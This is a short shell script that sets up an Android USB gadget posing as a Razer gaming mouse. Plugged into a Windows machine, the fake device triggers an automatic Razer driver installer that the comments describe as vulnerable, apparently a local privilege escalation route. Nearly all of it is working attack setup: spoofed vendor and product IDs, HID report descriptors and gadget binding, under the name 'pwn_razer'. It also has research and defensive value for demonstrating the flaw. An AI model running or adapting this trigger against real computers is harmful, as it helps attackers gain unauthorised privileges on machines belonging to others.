# MINIMAL USB gadget setup using CONFIGFS for simulating Razer Gaming HID
# devices for triggering the vulnerable Windows Driver installer
# credits for the Windows Driver install vuln: @j0nh4t
#
# https://twitter.com/j0nh4t/status/1429049506021138437
# https://twitter.com/an0n_r0/status/1429263450748895236
#

# the script was developed & tested on Android LineageOS 18.1

# work as root
su

# enable CONFIGFS
mount -t configfs none /sys/kernel/config

# create gadget
mkdir /sys/kernel/config/usb_gadget/pwn_razer
cd /sys/kernel/config/usb_gadget/pwn_razer

# set vendor (Razer) & product id
# for a list of suitable devices see the inf files in driver cab archive
# (feel free to change the product id)
echo 0x1532 > idVendor
echo 0x023e > idProduct

# set USB version 2
echo 0x0200 > bcdUSB

# set device to class to Misc / Interface Association Descriptor.
echo 0xEF > bDeviceClass
echo 0x02 > bDeviceSubClass
echo 0x01 > bDeviceProtocol

# set some info strings
mkdir -p strings/0x409
echo "deadbeefdeadbeef" > strings/0x409/serialnumber
echo "an0n" > strings/0x409/manufacturer
echo "fake Razer device" > strings/0x409/product
mkdir -p configs/c.1/strings/0x409
echo "basic Multi-function device with single TLC (MI_02)" > configs/c.1/strings/0x409/configuration

# set some fake power config values
echo 250 > configs/c.1/MaxPower
echo 0x80 > configs/c.1/bmAttributes

# add 3 mouse HID devices (protocol 2) with a basic HID report descriptor
for i in g1 g2 g3 ; do
  mkdir -p functions/hid.${i}
  echo 2 > functions/hid.${i}/protocol
  echo 6 > functions/hid.${i}/report_length
  echo BQEJAqEBCQGhAIUBBQkZASkDFQAlAZUDdQGBApUBdQWBAwUBCTAJMRWBJX91CJUCgQaVAnUIgQHAwAUBCQKhAQkBoQCFAgUJGQEpAxUAJQGVA3UBgQKVAXUFgQEFAQkwCTEVACb/f5UCdRCBAsDA | base64 -d > functions/hid.${i}/report_desc
done

# activate the HID devices
for i in g1 g2 g3 ; do
  ln -s functions/hid.${i} configs/c.1/
done

# bind (for activating, disable default gadget and enable the new one)
# might need to be changed (if the active gadget is not in ../g1)
echo "" > ../g1/UDC ; getprop sys.usb.controller > UDC
